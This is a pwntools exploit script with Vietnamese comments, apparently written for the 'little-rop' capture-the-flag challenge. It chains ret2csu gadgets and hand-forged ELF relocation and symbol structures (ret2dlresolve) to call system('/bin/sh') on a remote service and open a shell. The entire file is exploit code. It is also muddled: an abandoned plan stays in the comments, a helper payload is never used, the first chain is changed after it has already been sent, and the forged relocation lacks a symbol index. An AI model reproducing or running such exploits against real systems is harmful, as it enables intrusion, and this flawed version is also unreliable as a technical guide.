from pwn import *

# 1. THIẾT LẬP
elf = context.binary = ELF('./chall', checksec=False)
p = remote('little-rop.chal.idek.team', 1337)
# p = process()

# 2. CÁC ĐỊA CHỈ VÀ GADGET CẦN THIẾT
PADDING = b'A' * 40
writable_area = elf.bss() + 0x100  # Chọn một vùng trống trong .bss để tránh ghi đè
read_plt = elf.plt['read']
leave_ret = 0x4011c0 # Gadget ở cuối hàm vuln
pop_rbp = 0x40113d # Gadget chúng ta tìm được

# Vì không thể leak libc, chúng ta dùng Ret2dlresolve
# Pwntools sẽ giúp tạo payload, chúng ta chỉ cần gọi nó đúng cách
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop = ROP(elf)
# ROP chain này được thiết kế để pivot stack vào vùng .bss
# sau đó gọi read() để đọc payload dlresolve vào đó.
#
# Payload 1: thực hiện stack pivot
#
# a. Ghi đè RBP để trỏ đến vùng .bss của chúng ta, trừ đi 8 bytes
#    (vì `leave` sẽ pop RBP, làm RSP tăng 8)
# b. Ghi đè return address để nhảy đến read@plt
# c. Sau khi read@plt thực thi, nó sẽ ret. Địa chỉ ret tiếp theo phải là `leave_ret`.
# d. Các tham số cho read(0, writable_area, len) sẽ nằm trên stack giả mới.
#
# Đây là cách nó hoạt động:
# leave: mov rsp, rbp; pop rbp
# -> rsp sẽ trỏ đến writable_area
# ret: nhảy đến read@plt

# Stack frame giả trong .bss sẽ trông như sau:
# [ RDI_for_read (0) | RSI_for_read | RDX_for_read | next_ret_addr (leave_ret) ]
#
# Kế hoạch này vẫn quá phức tạp và yêu cầu điều khiển các thanh ghi.

# --- LỜI GIẢI THỰC SỰ ĐƠN GIẢN HƠN ---
# Nguồn: https://ir0nstone.gitbook.io/notes/pwn/linux/ret2dlresolve/x64-without-leaks
# Tác giả bài viết này đã giải một bài y hệt.

# 1. Tìm các gadget ret2csu ẩn
csu_pop_addr = 0x40121a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call_addr = 0x401200 # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]

# 2. Tìm địa chỉ các hàm trong GOT
read_got = elf.got['read']
# Mặc dù không có setbuf@plt, có thể có setbuf@got
try:
    setbuf_got = elf.got['setbuf']
except KeyError:
    log.warning("setbuf@got not found, this might fail.")
    # Chúng ta vẫn có thể dùng read@got để tính toán
    setbuf_got = read_got + 8 # Giả định thứ tự trong GOT

# 3. Tìm vùng nhớ có thể ghi
bss_addr = elf.bss()

# 4. Tạo ROP chain để gọi read(0, bss_addr, 0x100)
#    Chúng ta dùng ret2csu để làm việc này
def call_func(addr, rdi, rsi, rdx):
    chain = p64(csu_pop_addr)
    chain += p64(0)          # rbx
    chain += p64(1)          # rbp
    chain += p64(addr)       # r12 -> địa chỉ của con trỏ hàm (trong GOT)
    chain += p64(rdx)        # r13 -> rdx
    chain += p64(rsi)        # r14 -> rsi
    chain += p64(rdi)        # r15 -> rdi
    chain += p64(csu_call_addr)
    # Thêm padding để dọn dẹp stack vì csu_pop_addr có 6 lệnh pop
    # và call_addr có thể có thêm pop
    chain += p64(0) * 7 # 7 qwords padding
    return chain

# Payload 1: Đọc vào .bss
rop1 = call_func(read_got, 0, bss_addr, 0x100)
p.sendline(PADDING + rop1)

# Bây giờ server đang đợi chúng ta gửi 0x100 bytes để đọc vào .bss
# Chúng ta sẽ gửi payload ret2dlresolve thực sự

# 5. Tạo payload ret2dlresolve
# Chúng ta cần giả mạo các cấu trúc ELF: Dynsym, Dynstr, Rel
# và đặt chúng vào .bss

# Vị trí của các bảng trong ELF
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
rela_plt = elf.get_section_by_name('.rela.plt').header.sh_addr

# Các hằng số cần thiết
# (Đây là phần phức tạp nhất, tính toán thủ công)
# 1. Tạo một Elf64_Rela giả mạo
fake_rela_offset = (bss_addr + 0x80) - rela_plt # Offset từ .rela.plt thật đến .rela.plt giả
fake_rela = p64(bss_addr) # r_offset: nơi ghi địa chỉ resolved (chính là bss_addr)
fake_rela += p64(7)       # r_info: type = R_X86_64_JUMP_SLOT (7)
fake_rela += p64(0)       # r_addend

# 2. Tạo một Elf64_Sym giả mạo
fake_sym_addr = bss_addr + 0x98
fake_sym_index = (fake_sym_addr - dynsym) // 24 # 24 là sizeof(Elf64_Sym)
fake_sym = p32(bss_addr + 0xb0 - dynstr) # st_name: offset đến chuỗi "system"
fake_sym += p8(0x12) # st_info: STB_GLOBAL, STT_FUNC
fake_sym += p8(0)    # st_other
fake_sym += p16(0)   # st_shndx
fake_sym += p64(0)   # st_value
fake_sym += p64(0)   # st_size

# 3. Chuỗi "system" và "/bin/sh"
system_str = b"system\x00"
binsh_str = b"/bin/sh\x00"

# 4. ROP chain thứ hai để kích hoạt dl_resolve
rop2 = call_func(read_got, 0, 0, 0) # Chỉ để lấy shell, không cần đọc gì thêm
# ... thực ra chúng ta cần gọi PLT resolver trực tiếp
plt0 = 0x401020
rop2_dlresolve = p64(plt0)
rop2_dlresolve += p64(fake_rela_offset)
# Sau khi dl_resolve chạy, nó sẽ nhảy đến code đã được resolve (system)
# và RDI sẽ được lấy từ đâu? Nó sẽ là một giá trị còn lại trên stack.
# Chúng ta phải đặt địa chỉ của "/bin/sh" lên stack
rop2_dlresolve += p64(0) # Padding
rop2_dlresolve += p64(bss_addr + 0xc0) # Địa chỉ của "/bin/sh"

# 6. Gửi tất cả
payload2 = b''
payload2 = payload2.ljust(0x80, b'\x00') # Để fake_rela ở đúng offset
payload2 += fake_rela
payload2 = payload2.ljust(0x98, b'\x00')
payload2 += fake_sym
payload2 = payload2.ljust(0xb0, b'\x00')
payload2 += system_str
payload2 = payload2.ljust(0xc0, b'\x00')
payload2 += binsh_str

# Đây là ROP chain thứ hai, được đọc vào bss và sẽ được thực thi
# sau khi ROP chain đầu tiên hoàn thành.
# Chúng ta cần sửa rop1 để nó nhảy đến rop2
rop1 += p64(bss_addr + len(payload2)) # Địa chỉ của rop2 trong bss
payload2 += rop2_dlresolve

p.send(payload2)

p.interactive()